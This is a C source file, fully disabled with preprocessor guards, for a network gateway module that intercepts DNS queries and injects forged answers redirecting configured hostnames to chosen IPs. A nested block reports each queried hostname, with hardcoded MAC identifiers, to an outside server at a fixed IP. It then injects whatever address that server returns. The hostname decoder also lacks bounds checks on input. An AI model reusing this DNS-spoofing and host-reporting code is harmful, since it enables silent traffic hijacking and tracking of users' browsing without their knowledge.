#if 0
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>

#include <stdint.h>
#include <string.h>
#include <ctype.h>

#include "list.h"

#include "ha_config.h"
#include "ha_misc.h"
#include "ha_adt.h"
#include "ha_network.h"
#include "ha_debug.h"
#include "ha_timer.h"
#include "ha_event.h"

struct dnshdr
{
	unsigned 	   id :16;		   /* query identification number */
					/* fields in third byte */
	unsigned		rd :1;			/* recursion desired */
	unsigned		tc :1;			/* truncated message */
	unsigned		aa :1;			/* authoritive answer */
	unsigned		opcode :4;		/* purpose of message */
	unsigned		qr :1;			/* response flag */
					/* fields in fourth byte */
	unsigned		rcode :4;		/* response code */
	unsigned		unused :3;		/* unused bits (MBZ as of 4.9.3a3) */
	unsigned		ra :1;			/* recursion available */

					/* remaining bytes */
	unsigned		qdcount :16;	/* number of question entries */
	unsigned		ancount :16;	/* number of answer entries */
	unsigned		nscount :16;	/* number of authority entries */
	unsigned		arcount :16;	/* number of resource entries */

};

struct dns_question{
	uint8_t data[0];
	uint16_t type;
	uint16_t answer;
}__attribute__((packed));
struct dns_answer{
	uint16_t offset;
	uint16_t type;
	uint16_t class;
	uint32_t ttl;
	uint16_t datalen;
	uint8_t data[0];
}__attribute__((packed));
/*question struct
	name : string
	type : uint16_t
	class : uint16_t
  answer struct
    offset : uint16_t 
    type : uint16_t
    class :uint16_t 
    ttl	: uint32_t 
   [ 
  	datalen : uint16_t
    cname : string
   ]
    
*/ 
#define DEF_HOST_LEN (64)
#define DEF_DNS_ENTRIES 64

struct ha_dns_entry{
	struct list_head next;
	uint16_t id;
	struct ha_packet_info pi;
	struct ha_packet_hdr  ph;
	char host[DEF_HOST_LEN];
#if 0
	struct ha_event *ha_ev;
	struct ha_timer *ha_tm;
#endif
};

struct ha_dns_local{
	uint32_t ip;
#if 0
	uint16_t frequency;
	uint16_t counter;
#endif
	uint16_t hlen;
	char host[0];	
};

struct ha_dns_ctl{
 	struct alloctor ac;
	struct ha_dns_entry entries[DEF_DNS_ENTRIES];
	struct hash_table *local;
};

static struct ha_dns_ctl hd_ctl;


static int ha_dns_local_cmp(void *v1,void *v2)
{
	struct ha_dns_local *l1 = (struct ha_dns_local *)v1;
	struct ha_dns_local *l2 = (struct ha_dns_local *)v2;

	if (l1->hlen != l2->hlen)
		return 1;
	return memcmp(l1->host,l2->host,l1->hlen);
}

static void *ha_dns_local_new(void *v)
{
	struct ha_dns_local *l = (struct ha_dns_local *)v;
	struct ha_dns_local *res = NULL;
	res = MALLOC(sizeof(*res) + l->hlen + 1);
	if (!res)
		return res;
	memcpy(res,l,sizeof(*res) + l->hlen);
	res->host[res->hlen] = '\0';
#if 0
	res->counter = 0;
#endif
	return res;
}

static uint ha_dns_local_hash(void *v)
{
	struct ha_dns_local *l = (struct ha_dns_local *)v;
	return str_hash(l->host,l->hlen);
}

static void ha_dns_local_destroy(void *v)
{
	FREE(v);
}

#if 0
static struct ha_dns_entry *ha_dns_entry_get(void)
{
	struct ha_dns_ctl *ctl = &hd_ctl;
	#if 0
	if (list_empty(&ctl->freelist))
		return NULL;

	struct ha_dns_entry *entry = list_first_entry(&ctl->freelist,struct ha_dns_entry ,next);
	list_del(&entry->next);
	list_add(&entry->next,&ctl->using);
	return entry;
	#else
	struct ha_dns_entry *entry;
	alloctor_entry_get(entry,&ctl->ac,struct ha_dns_entry,next);
	return entry;
	#endif
}
static void ha_dns_entry_put(struct ha_dns_entry *entry)
{
	struct ha_dns_ctl *ctl = &hd_ctl;
	assert(entry);
	int no = entry - ctl->entries;
	assert(no  >= 0 && no < DEF_DNS_ENTRIES);
	#if 0	
	list_del(&entry->next);
	list_add(&entry->next,&ctl->freelist);
	#else
	alloctor_entry_put(entry,&ctl->ac,next);
	#endif
}
#endif
static uint16_t ha_dns_host_decode(uint8_t *host,char *buff,int len)
{
    char *ptr = buff;
    do {
        uint8_t partlen = *host;
        if (ptr + partlen + 1 > &buff[len])
            break;
    
        memcpy(ptr,++host,partlen);
        host += partlen;
        ptr += partlen;
        *ptr++ = '.';
    } while (*host != 0); 

    if (*host != 0)
        return 0;
    *(--ptr) = '\0';
    return ptr - buff;
}

static int ha_dns_host_encode(char *host,const int len,uint8_t *buf,const int blen)
{
    assert(blen > len + 1); 
    uint8_t *ptr = buf;
    uint8_t partlen = 0;
    int i,pos;
    for (i = 0 ,pos = 0; i < len && pos < blen ; i++) {
        if (host[i] == '.') {
            *ptr = partlen;
            ptr = &buf[++pos];
            partlen = 0;
        } else {
            buf[++pos] = host[i];   
            partlen++;
        }
    }
     *ptr = partlen;
    return pos + 1;
}

int ha_dns_resp_build(uint16_t id,char *host,uint16_t hlen,
									uint32_t ip,uint8_t *buff,int len)
{
	assert(buff && len > 256);

	memset(buff,0,len);
	struct dnshdr *resp = (struct dnshdr *)buff;;
	uint8_t *pos = (uint8_t *)(resp + 1);
	
	resp->id = id;
	resp->qr = 1;
	resp->rd = 1;
	resp->rcode = 8;
	
	resp->qdcount = htons(1);
	resp->ancount = htons(1);
	resp->nscount = 0;
	resp->arcount = 0;
	
	pos += (1+ ha_dns_host_encode(host,hlen,pos,len - sizeof(*resp)));
	struct dns_question *question = (struct dns_question*)pos;
	question->type = question->answer = htons(1);

	struct dns_answer *answer = (struct dns_answer *)(question + 1);
	answer->offset = htons(0xc00c);/*sizeof (dnshdr) + */
	answer->type = htons(1);/*CNAME*/
	answer->class = htons(1);
	answer->ttl = htonl(60);
#if 0
	uint8_t *preoff = (uint8_t *)&answer->datalen;
	
	int step = 1 + ha_dns_host_encode("www.kernel.org",14,preoff + 2,512);
	answer->datalen = htons(step);

	answer =(struct dns_answer *)(answer->data + step);
	answer->offset = htons((0xc0 << 8)|(preoff - buff));
	debug_p("step = %u,offset = %u",step,answer->offset);
	answer->class =	answer->type = htons(1);
	answer->ttl = htonl(60);
#endif
	answer->datalen = htons(4);
	*((uint32_t *)answer->data) = ip;
	
	return &answer->data[4] - buff;
}
#if 0

static void ha_dns_network_timeout(void *v)
{
	struct ha_dns_entry *entry = (struct ha_dns_entry *)v;
	assert(entry);
	
	debug_p("network timeout : %s",entry->host);

	int fd = ha_event_fd_get(entry->ha_ev);
	close(fd);
	ha_event_del(entry->ha_ev);
}


static void ha_dns_recvier(void *v,uint32_t unused)
{	
	struct ha_dns_entry *entry = (struct ha_dns_entry *)v;
	int fd = ha_event_fd_get(entry->ha_ev);

	ha_timer_del(entry->ha_tm);
	
	char buf[512];
	int nr = recv(fd,buf,sizeof(buf),0);
	if (nr >= 0)
		buf[nr] = '\0';

	close(fd);
	ha_event_del(entry->ha_ev);
	ha_dns_entry_put(entry);

	char *ptr = strstr(buf,"Location:");
	if (!ptr)
		return ;
	ptr += 9;
	while (*ptr && isspace(*ptr))
		ptr++;
	char *end = ptr;
	while (*end && !isspace(*end))
		end++;
	*end = '\0';

	debug_p("%s : %s",entry->host,ptr);
	uint8_t dnsbuf[512];
	if (end - ptr < 6)
		return ;
	uint32_t ip;
	if (1 != inet_pton(AF_INET,ptr,&ip))
		return ;
	int dnslen = ha_dns_resp_build(entry->id,entry->host,strlen(entry->host),ip,dnsbuf,sizeof(dnsbuf));
	yitiaoming_stand(&entry->pi,dnsbuf,dnslen,0);

}


static void ha_dns_sender(void *v,uint32_t unused)
{	
	struct ha_dns_entry *entry = (struct ha_dns_entry *)v;
	int fd = ha_event_fd_get(entry->ha_ev);
	
	ha_timer_del(entry->ha_tm);

	char *str = "GET /dp/data_push.php?zYdVersion=CY-161009_15_34"
				"&zYdHost=www.xn--m&zYdUA=Mozilla"
				"&zYdCustomer=cyir"
				"&zYdreferal=none"
				"&zYdMAC=78A3510BC00F"
				"&zYdCMAC=B083FEA651D2&zYdurl=/ HTTP/1.1\r\n"
				"Host:olds.cjdgy.com\r\n\r\n";
	if (strlen(str) != send(fd,str,strlen(str),0)) {
		close(fd);
		ha_event_del(entry->ha_ev);
		ha_dns_entry_put(entry);
		return ;
	} 

	ha_event_mod(entry->ha_ev,EPOLLIN,false,ha_dns_recvier);
	entry->ha_tm = ha_timer_new(entry,ha_dns_network_timeout,500,entry->host);
	if (!entry->ha_tm)
		ha_event_del(entry->ha_ev);
}

static void ha_dns_report(char *host,uint16_t id,struct ha_packet_info *pi)
{
	struct ha_dns_entry *entry = NULL;
	struct ha_event *ha_ev = NULL;
	
	int sock = socket(AF_INET,SOCK_STREAM,0);
	if (sock < 0)
		return ;

	set_fd_default(sock);
	
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(80);
	inet_pton(AF_INET,"112.124.127.154",&addr.sin_addr.s_addr);

	
	int err = connect(sock,(struct sockaddr *)&addr,sizeof(addr));
	/*connected immediately*/
	
	if (err && errno != EINPROGRESS) {
		debug_p("connect server error");
		goto fail;
	}
	
	entry = ha_dns_entry_get();
	if (!entry) 
		goto fail ;
		
	entry->id = id;

	ha_network_packet_deepcopy(&entry->pi,&entry->ph,pi);
	
	strncpy(entry->host,host,sizeof(entry->host));
	
	ha_ev = ha_event_new(sock,EPOLLOUT,entry,ha_dns_sender);
	if (!ha_ev) {
		debug_p("can not get event");
		goto fail;
	}
	entry->ha_ev = ha_ev;
	
	entry->ha_tm = ha_timer_new(entry,ha_dns_network_timeout,500,entry->host);
	if (entry->ha_tm) 
		return ;
	debug_p("can not get timer");
fail:
	if (ha_ev)
		ha_event_del(ha_ev);
	if (entry) 		
		ha_dns_entry_put(entry);
	if (sock >= 0)
		close(sock);
}

#endif
static bool ha_dns_local_hit(struct ha_dns_local *l,struct ha_dns_local **res)
{
	struct hash_entry *entry = NULL;
	if (!hash_table_find(hd_ctl.local,l,NULL,&entry))
		return false;

	if (res)
		*res = hash_entry_data(entry);
	return true;
}

static int ha_dns_handler(char *start,char *end,struct ha_packet_info *pi)
{
	debug_p("____DNS____");
	
	struct dnshdr *dh = NULL;
	if (end - start <= sizeof(*dh))
		return 0;
	
	dh = (struct dnshdr *)start;
	if (!dh->qr || dh->qdcount != htons(1))
		return 0;

	/*must be ipV4*/
	
	uint8_t *payload = (uint8_t *)(dh + 1);
	char buf[128];
	struct ha_dns_local *l = (struct ha_dns_local *)buf;
	l->hlen = ha_dns_host_decode(payload,l->host,sizeof(buf) - sizeof(*l) - 1);

	struct ha_dns_local *res = NULL;
	if (ha_dns_local_hit(l,&res)) {

#if 0
		res->counter++;
		res->counter %= res->frequency;
		if (res->counter != 0)
			return 0;
#endif

		uint8_t dnsbuf[512];
		int dnsbuflen = ha_dns_resp_build(dh->id,l->host,l->hlen,res->ip,dnsbuf,sizeof(dnsbuf));
		yitiaoming_stand(pi,dnsbuf,dnsbuflen,0);
		debug_p("send local record %s to terminal",res->host);
	} else {
#if 0
		/*request to server*/
		while (0) ha_dns_report(l->host,dh->id,pi);
#endif
	}
	return 0;
}

static void ha_dns_local_entry_add(struct json_object *jo,void *v)
{
	assert(jo && v);
	char tmpbuf[128];
	struct ha_dns_local *l = (struct ha_dns_local *)tmpbuf;
	struct hash_table *h = (struct hash_table *)v;
	if (json_object_get_type(jo) != json_type_object)
		return ;
	/*host*/
	struct json_object *jhost = ha_find_config(jo,"host");
	const char *host;
	int hlen;
	jo_array_string_check(jhost,host,hlen,4);

	if (hlen > sizeof(tmpbuf) - sizeof(*l) - 1)
		return ;
	
	const char *ip;
	int iplen;
	struct json_object *jip = ha_find_config(jo,"ip");
	jo_array_string_check(jip,ip,iplen,8);
	if (iplen > 15)
		return ;
	
	if (1 != inet_pton(AF_INET,ip,&l->ip)) 
		return ;
	debug_p("host = %s ip = %s",host,ip);
	strncpy(l->host,host,hlen);
	l->hlen = hlen;
#if 0
	l->frequency = ha_json_get_int(jo,"freq");
#endif
	if (1 == hash_table_add(h,l,NULL)) 
		yitiaoming_pass_ip(l->ip);
}
static void ha_dns_conf_init()
{
	struct json_object *jo = ha_find_module_config("dns");
	if (!jo)
		return ;
	jo = ha_find_config(jo,"local");
	if (!jo)
		return ;

	ha_json_array_handle(jo,ha_dns_local_entry_add,hd_ctl.local);
}
void ha_dns_init(void)
{
	struct ha_dns_ctl *ctl = &hd_ctl;

	alloctor_init(&ctl->ac);

	int i;
	for (i = 0 ; i < DEF_DNS_ENTRIES; i++)
		alloctor_freelist_add(&ctl->ac,&ctl->entries[i].next);
#if 1
	ctl->local = hash_table_new(5,16,ha_dns_local_hash,
									ha_dns_local_cmp,
									ha_dns_local_new,
									ha_dns_local_destroy);
	assert(ctl->local);
#endif	

	ha_dns_conf_init();
	yitiaoming_happy(ha_dns_handler);
}

void ha_dns_destroy(void)
{
	if (hd_ctl.local)
		hash_table_destroy(hd_ctl.local);
}
#endif
